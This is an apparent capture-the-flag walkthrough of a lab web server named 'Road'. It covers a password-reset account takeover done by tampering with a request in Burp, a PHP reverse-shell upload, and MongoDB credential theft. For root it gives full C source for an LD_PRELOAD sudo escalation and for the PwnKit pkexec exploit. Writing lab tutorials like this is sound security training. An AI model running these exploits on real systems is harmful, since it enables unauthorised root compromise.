<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>road</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>road</h1><br/><p><strong><h1>Road</h1></strong></p><p>Inspired by a real-world pentesting engagement</p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Rustscan &amp; Nmap</strong></p><p><img src="images/51-1.png" alt="images/51-1.png" /></p><p></p><p><img src="images/51-2.png" alt="images/51-2.png" /></p><p></p><p>Two Services Running are SSH &amp; Webserver.</p><p></p><p></p><p><strong><h2>Website Enumeration</h2></strong></p><p></p><p><img src="images/51-3.png" alt="images/51-3.png" /></p><p></p><p>We have a sky couriers website. I searched around and found mostly normal things.</p><p>However, when we click on the<strong> “Management Central”, </strong>we are taken to a login page with following URL.</p><p><strong><a href="http://10.10.93.148/v2/admin/login.html">http://10.10.93.148/v2/admin/login.html</a></strong></p><p></p><p><img src="images/51-4.png" alt="images/51-4.png" /></p><p></p><p>Next, I created a normal user account by clicking on <strong>REGISTER</strong>.</p><p></p><p><img src="images/51-5.png" alt="images/51-5.png" /></p><p></p><p>I Entered the Following<strong> Dummy Details </strong>&amp; Then Clicked on <strong>REGISTER</strong></p><p>Email Address: 			bob@tryhackme.com</p><p>Password:					bob123</p><p>Confirm Password:		bob123</p><p>10 Digit Mobile No: 	998877665</p><p></p><p>We get a message “<strong>your account has been created</strong>” on the <strong>top left</strong> of the page. However, the login page reloads within 1 second.</p><p></p><p>Next, I logged in to the freshly created user by entering the<strong> Email &amp; Password</strong> as above &amp; clicking on <strong>SIGN IN</strong>.</p><p><img src="images/51-6.png" alt="images/51-6.png" /></p><p></p><p>I am taken to my user&#39;s Dashboard.</p><p></p><p><strong><h2>Intresting Find</h2></strong></p><p></p><p><img src="images/51-7.png" alt="images/51-7.png" /></p><p></p><p>In the <strong>Top Right Corner</strong> click on the <strong>Arrow</strong> after <strong>username</strong> &amp; click on <strong>Profile</strong>. It will open the Profile configuration page.</p><p><strong>Scroll</strong> to the <strong>bottom of the page.</strong></p><p></p><p><img src="images/51-8.png" alt="images/51-8.png" /></p><p></p><p>As we can see, the <strong>EDIT PROFILE</strong> button will update the changes made &amp; the <strong>intresting find</strong> is the <strong>option</strong> to <strong>set</strong> a <strong>Profile Image</strong>.</p><p>We could try to upload php reverse shells if allowed.</p><p></p><p>However, the message below it reads that currently only the admin can use this feature.</p><p>Also we found the Admin&#39;s Email Address Or Username (Since Both are same -→ We know this by creating my user)</p><p></p><p><strong>Admin&#39;s Email Address: admin@sky.thm</strong></p><p></p><p></p><p><strong><h2>Reseting Admin&#39;s Password</h2></strong></p><p></p><p>In the previous step, I found out the admin&#39;s Email address. </p><p>Inside bob&#39;s account scroll up &amp; click on <strong>“ResetUser”</strong> present on the left of the page.</p><p></p><p><img src="images/51-9.png" alt="images/51-9.png" /></p><p></p><p></p><p>We get the following page.</p><p><img src="images/51-10.png" alt="images/51-10.png" /></p><p></p><p>As we can see, the Username part is <strong>fixed</strong>. I need to send this reset request using <strong>Burpsuite</strong> to modify it. I entered New Password &amp; Confirm Password as <strong>123456</strong> &amp; click on <strong>Submit</strong> once Burpsuite was setup.</p><p></p><p><img src="images/51-11.png" alt="images/51-11.png" /></p><p></p><p></p><p>We can see the burpsuite proxy captured the request and the parameter <strong>uname</strong> has the <strong>username</strong> value. I change the value from b<strong>ob@tryhackme.com</strong> to Admin&#39;s username <strong>admin@sky.thm</strong> &amp; <strong>Forward</strong> the Request.</p><p></p><p>I got the following message that <strong>Password Changed</strong></p><p><img src="images/51-12.png" alt="images/51-12.png" /></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Now, we can login as admin using the following credentials.</p><p></p><p><strong>Username: admin@sky.thm</strong></p><p><strong>Password: 123456</strong></p><p></p><p>I closed burpsuite and logged out of my dummy user. Then logged in as admin using the above credentials.</p><p>I successfully Logged in.</p><p></p><p><img src="images/51-13.png" alt="images/51-13.png" /></p><p></p><p></p><p>Next, I opend the Profile page clicking the dropdown as earlier to get to the profile picture upload page.</p><p></p><p>The feature is enabled now as we are logged in as Admin.</p><p><img src="images/51-14.png" alt="images/51-14.png" /></p><p></p><p>I clicked on <strong>Browse</strong> and <strong>uploaded a PHP Reverse Shell</strong>.</p><p>I started <strong>Netcat Listener</strong> on my Local machine.</p><p>Then I Clicked On <strong>EDIT PROFILE</strong> to upload the file.</p><p></p><p><strong>Note:</strong> Once I finish the above steps, i go back to profile configuration page. However, the upload was successful. (Thus, there are no filetype filters in place)</p><p></p><p><strong>Important:</strong> The next big thing is to find my uploaded file to initiate the reverse shell. I tried directory enumeration on URL : {http://10.10.93.148/v2/} but didn&#39;t find any intresting result.</p><p>I opened the <strong>Profile configuration page&#39;s source code</strong> &amp; I finally found the directory as a <strong>comment</strong>.</p><p></p><p></p><p><img src="images/51-15.png" alt="images/51-15.png" /></p><p></p><p>After<strong> scrolling down</strong>, at around <strong>line 678</strong> i found the comment mentioning the upload directory.</p><p><strong>/v2/profileimages/</strong></p><p>Lets open it.</p><p><img src="images/51-16.png" alt="images/51-16.png" /></p><p></p><p>When i Opened the directory, it opened but we can&#39;t view its contents and get the message that <strong>Directory Listing is Disabled</strong>.</p><p>However, i can still <strong>access my file</strong> if i know the <strong>name</strong> which i do !! (Name of the File I uploaded ----&gt; php-reverse-shell.php)</p><p></p><p>I will use the following URL to open my file directly.</p><p><strong>http://10.10.93.148/v2/profileimages/php-reverse-shell.php</strong></p><p></p><p>After Entering the above <strong>URL</strong> in the <strong>browser</strong> and hitting <strong>Enter</strong>, we get the <strong>Reverse Shell connection is our Listener</strong>.</p><p></p><p><img src="images/51-17.png" alt="images/51-17.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>I uploaded the <strong>Linpeas.sh</strong> to check for privilege Escalation.</p><p>There are 3 Distinct Methods of Privilege Escation.</p><p></p><p><strong><span style="text-decoration:underline;">Method - 1</span></strong></p><p></p><p>Linpeas output snip below tells that both<strong> mysql (3306) &amp; mongodb (27017)</strong> are running in the system listening to localhost.</p><p></p><p><img src="images/51-18.png" alt="images/51-18.png" /></p><p></p><p>Netstat is not intalled on the system. However, we can use the ss (Socket Status)  utility to get idea about connections. (Manually)</p><p><strong>ss -lt</strong></p><p><img src="images/51-19.png" alt="images/51-19.png" /></p><p></p><p>I tried logging in to mysql with default credentials but it didn&#39;t work. However, when i tried to open MongoDB shell, it worked.</p><p></p><p><span style="text-decoration:underline;">Commands</span>:</p><p><strong>mongo 27017</strong></p><p><strong>show dbs</strong></p><p><strong>use backup</strong></p><p><strong>show collections</strong></p><p><strong>db.user.find()</strong></p><p></p><p><img src="images/51-20.png" alt="images/51-20.png" /></p><p></p><p>As we can see, we have found the webdeveloper user&#39;s password. Lets SSH to the machine using the following credentials.</p><p></p><p><strong>Credentials Found:</strong></p><p>Username: 	webdeveloper</p><p>Password: 	BahamasChapp123!@#</p><p></p><p>After SSH Login, we get the user flag in the user&#39;s home and then check for further escalation options. As highlighted below LD_PRELOAD can help us in running a bash as privileged user.</p><p><img src="images/51-21.png" alt="images/51-21.png" /></p><p></p><p>I will create a <strong>preload.c</strong> file with the following contents:</p><p></p><p><strong>#include &lt;stdio.h&gt;</strong></p><p><strong>#include &lt;sys/types.h&gt;</strong></p><p><strong>#include &lt;stdlib.h&gt;</strong></p><p><strong></strong></p><p><strong>void _init() {</strong></p><p><strong>        unsetenv(&quot;LD_PRELOAD&quot;);</strong></p><p><strong>        setresuid(0,0,0);</strong></p><p><strong>        system(&quot;/bin/bash -p&quot;);</strong></p><p><strong>}</strong></p><p></p><p><img src="images/51-22.png" alt="images/51-22.png" /></p><p></p><p>Then, i compiled it using the following command.</p><p></p><p><strong>gcc -fPIC -shared -nostartfiles -o preload.so preload.c</strong></p><p></p><p><img src="images/51-23.png" alt="images/51-23.png" /></p><p></p><p></p><p>Now, our library file is ready. We will use the sudo in the following way to call the library file &amp; gain root shell.</p><p></p><p><strong>sudo LD_PRELOAD=/home/webdeveloper/preload.so /usr/bin/sky_backup_utility</strong></p><p></p><p><img src="images/51-24.png" alt="images/51-24.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method - 2</span></strong> </p><p></p><p>Use the MongoDB to gain SSH credentials as before.</p><p>Notice that the user <strong>webdeveloper</strong> is part of <strong>sudo</strong> group.</p><p></p><p>A vulnerability in pkexec can be exploited here.</p><p>(pkexec is used to run GUI tools as another authorized user (Also root) )</p><p></p><p>Open 2 SSH Connections to the Target Machine:</p><p></p><p><img src="images/51-25.png" alt="images/51-25.png" /></p><p></p><p>On the First Session: Run <strong>echo $$</strong> &amp; Note the <strong>PID</strong></p><p>On the Second Session: Run <strong>pkttyagent -p &lt;PID&gt;</strong> [Enter the PID Received in First Session]</p><p>On the First Session: Run <strong>pkexec /bin/bash</strong></p><p>On the Second Session: We will be prompted for <strong>webdeveloper&#39;s password</strong>. Enter it there &amp; we will get a root bash shell in First Session.</p><p></p><p><img src="images/51-26.png" alt="images/51-26.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Method - 3</span></strong></p><p></p><p><img src="images/51-27.png" alt="images/51-27.png" /></p><p></p><p>The CVE mentioned by linpeas uses the same vulnerability exploited in Method - 2.</p><p>However, this escalation is the most powerful one as it doesn&#39;t requires an user in sudo group. This exploit can be run as <strong>www-data</strong></p><p></p><p>We opend the CVE in Exploit DB. </p><p><a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjRrJOYt6j5AhUo4jgGHSwUCaUQFnoECAIQAQ&url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F50689&usg=AOvVaw1hhH354Ge2nzJ_58sZqVad">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjRrJOYt6j5AhUo4jgGHSwUCaUQFnoECAIQAQ&amp;url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F50689&amp;usg=AOvVaw1hhH354Ge2nzJ_58sZqVad</a></p><p>The document has 3 parts. I made 3 files with the following contents.</p><p></p><p><strong>1. Makefile</strong></p><p>all:</p><p>	gcc -shared -o evil.so -fPIC evil-so.c</p><p>	gcc exploit.c -o exploit</p><p></p><p>clean:</p><p>	rm -r ./GCONV_PATH=. &amp;&amp; rm -r ./evildir &amp;&amp; rm exploit &amp;&amp; rm evil.so</p><p>	</p><p><strong>2. exploit.c</strong></p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p></p><p>#define BIN &quot;/usr/bin/pkexec&quot;</p><p>#define DIR &quot;evildir&quot;</p><p>#define EVILSO &quot;evil&quot;</p><p></p><p>int main()</p><p>{</p><p>    char *envp[] = {</p><p>        DIR,</p><p>        &quot;PATH=GCONV_PATH=.&quot;,</p><p>        &quot;SHELL=ryaagard&quot;,</p><p>        &quot;CHARSET=ryaagard&quot;,</p><p>        NULL</p><p>    };</p><p>    char *argv[] = { NULL };</p><p></p><p>    system(&quot;mkdir GCONV_PATH=.&quot;);</p><p>    system(&quot;touch GCONV_PATH=./&quot; DIR &quot; &amp;&amp; chmod 777 GCONV_PATH=./&quot; DIR);</p><p>    system(&quot;mkdir &quot; DIR);</p><p>    system(&quot;echo &#39;module\tINTERNAL\t\t\tryaagard//\t\t\t&quot; EVILSO &quot;\t\t\t2&#39; &gt; &quot; DIR &quot;/gconv-modules&quot;);</p><p>    system(&quot;cp &quot; EVILSO &quot;.so &quot; DIR);</p><p></p><p>    execve(BIN, argv, envp);</p><p></p><p>    return 0;</p><p>}</p><p></p><p><strong>3. evil.so.c</strong></p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;stdlib.h&gt;</p><p>#include &lt;unistd.h&gt;</p><p></p><p>void gconv() {}</p><p></p><p>void gconv_init() {</p><p>    setuid(0);</p><p>    setgid(0);</p><p>    setgroups(0);</p><p></p><p>    execve(&quot;/bin/sh&quot;, NULL, NULL);</p><p>}</p><p></p><p></p><p>Now, inside the target machine, i run the following commands.</p><p></p><p><strong>make all</strong></p><p><strong>./exploit</strong></p><p></p><p><strong>Note:</strong> The make command works in Local Kali machine, however on the target machine it is not installed.</p><p>We have 2 options. We compile the exploit in Kali machine and send only the exploit.</p><p></p><p>Or</p><p></p><p>We manually run the commands of the Makefile as gcc is installed on the target.</p><p></p><p>On Target Machine:</p><p></p><p><strong>gcc -shared -o evil.so -fPIC evil-so.c</strong></p><p><strong>gcc exploit.c -o exploit</strong></p><p></p><p><img src="images/51-28.png" alt="images/51-28.png" /></p><p></p><p>Thanks !!</p></div>
</body>
</html>
